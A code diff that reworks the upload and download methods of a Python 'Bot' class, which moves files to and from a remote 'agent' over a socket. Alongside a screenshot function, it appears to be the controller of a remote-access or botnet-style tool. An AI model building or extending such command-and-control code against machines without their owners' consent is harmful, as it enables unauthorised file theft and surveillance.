@@ -100,50 +100,71 @@ class Bot:
                 print(f"Unexpected error: {e}")
                 return None
 
-    def upload_file(self, file_name):
+    def upload_file(self, file_data, filename):
+        """Upload a file to the agent"""
         try:
-            f = open(file_name, 'rb')
-            data = f.read()
-            f.close()
-        except FileNotFoundError:
-            print(f"The file {file_name} does not exist.")
-            return
-        except IOError as e:
-            print(f"Error reading from {file_name}: {e}")
-            return
+            # Send file size first
+            self.reliable_send({
+                'command': 'upload',
+                'filename': filename,
+                'size': len(file_data)
+            })
+            
+            # Wait for ready confirmation
+            response = self.reliable_recv()
+            if not response.get('ready'):
+                return False, "Agent not ready to receive file"
+            
+            # Send file data
+            self.target.sendall(file_data)
+            
+            # Get upload confirmation
+            response = self.reliable_recv()
+            if response.get('success'):
+                return True, f"File {filename} uploaded successfully"
+            else:
+                return False, response.get('error', 'Upload failed')
+            
+        except Exception as e:
+            return False, f"Upload error: {str(e)}"
 
+    def download_file(self, filename):
+        """Download a file from the agent"""
         try:
-            self.target.send(data)
-        except socket.error as e:
-            print(f"Error sending data: {e}")
-            return
-
-        print(f"File {file_name} uploaded successfully.")
-
-    def download_file(self, file_name):
-        try:
-            f = open(file_name, 'wb')
-        except IOError as e:
-            print(f"Error opening file {file_name} for writing: {e}")
-            return
-        self.target.settimeout(2)
-        chunk = None
-        try:
-            while True:
-                try:
-                    if chunk is not None:
-                        f.write(chunk)
-                    chunk = self.target.recv(1024)
-                except socket.timeout:
+            # Request file download
+            self.reliable_send({
+                'command': 'download',
+                'filename': filename
+            })
+            
+            # Get initial response with file size or error
+            response = self.reliable_recv()
+            if response.get('error'):
+                return False, response['error'], None
+            
+            file_size = response.get('size')
+            if not file_size:
+                return False, "No file size received", None
+            
+            # Receive file data
+            received_data = b''
+            remaining = file_size
+            
+            while remaining > 0:
+                chunk = self.target.recv(min(4096, remaining))
+                if not chunk:
                     break
-        except socket.error as e:
-            print(f"Error receiving data: {e}")
-        finally:
-            f.close()
-        self.target.settimeout(None)
-        print(f"File {file_name} downloaded successfully.")
+                received_data += chunk
+                remaining -= len(chunk)
+            
+            if len(received_data) == file_size:
+                return True, f"File {filename} downloaded successfully", received_data
+            else:
+                return False, "Download incomplete", None
+            
+        except Exception as e:
+            return False, f"Download error: {str(e)}", None
 
-        
     def screenshot(self, count):
         os.makedirs(SCREENSHOT_DIR, exist_ok=True)
         file_name = f'{SCREENSHOT_DIR}/screenshot_{count}.png'
